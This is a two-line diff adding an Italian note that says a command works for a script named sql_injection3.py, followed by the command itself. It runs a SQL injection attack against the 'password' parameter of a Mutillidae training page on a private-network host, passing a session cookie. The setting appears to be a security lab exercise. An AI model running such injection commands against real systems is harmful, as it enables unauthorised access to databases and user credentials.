@@ -1,0 +1,2 @@
+questo comando funziona per sql_injection3.py 
+sudo python3 sql_injection3.py --host="192.168.13.143" -u='/mutillidae/index.php?page=user-info.php&username=&password=&user-info-php-submit-button=View+Account+Details' --param="password" --cookie="PHPSESSID=3e726056cf963b43bd87036e378d07b" > mutillidae.html
